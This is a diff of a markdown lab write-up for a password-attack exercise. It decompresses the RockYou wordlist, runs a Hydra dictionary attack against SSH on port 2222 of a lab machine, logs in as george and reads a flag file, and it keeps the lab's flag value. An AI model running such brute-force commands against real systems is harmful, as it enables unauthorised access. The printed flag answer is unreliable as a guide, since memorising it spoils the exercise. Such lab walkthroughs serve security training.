@@ -38,45 +38,25 @@ Unzipping Gzip Archive and attacking SSH
 
 Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on Password Attacks - SSH - VM #1. Find the flag in the george user's home directory.
 >``` shell
-># Navigate to the default wordlists directory
+># 1) Navigate to the default wordlists directory on Kali
 >kali@kali:~$ cd /usr/share/wordlists/
 >
-># Decompress the RockYou wordlist (required before use)
+># 2) Decompress the RockYou wordlist so it can be used for password attacks
 >kali@kali:~$ sudo gzip -d rockyou.txt.gz
 >
-># Run Hydra to perform a dictionary attack against SSH on port 2222
+># 3) Perform a dictionary attack against the SSH service on port 2222 (-l specifies the username, -P specifies the password list, -s specifies the non-default SSH port)
 >kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.123.201
 >
-># ========== Expected Result ==========
->...
->[2222][ssh] host: 192.168.123.201   login: george   password: chocolate
->...
-># =====================================
->
-># Log in to the target via SSH using the discovered credentials
+># 4) Log in to the target system via SSH using the discovered credentials
 >kali@kali:~$ ssh george@192.168.123.201 -p 2222
 >
-># ========== Expected Result ==========
->george@83fe940bd7cf:~$ 
-># =====================================
->
-># Locate the flag
+># 5) Confirm the current working directory after logging in
 >george@83fe940bd7cf:~$ pwd
 >
-># ========== Expected Result ==========
->/home/george
-># =====================================
->
+># 6) List files in the user's home directory to locate the flag
 >george@83fe940bd7cf:~$ ls
 >
-># ========== Expected Result ==========
->flag.txt
-># =====================================
->
->george@83fe940bd7cf:~$ cat flag.txt 
->
-># ========== Expected Result ==========
->OS{a84f7931068060b66d4893e0758f5960}
-># =====================================
+># 7) Display the contents of the flag file to complete the lab
+>george@83fe940bd7cf:~$ cat flag.txt
 >```
 >OS{a84f7931068060b66d4893e0758f5960}
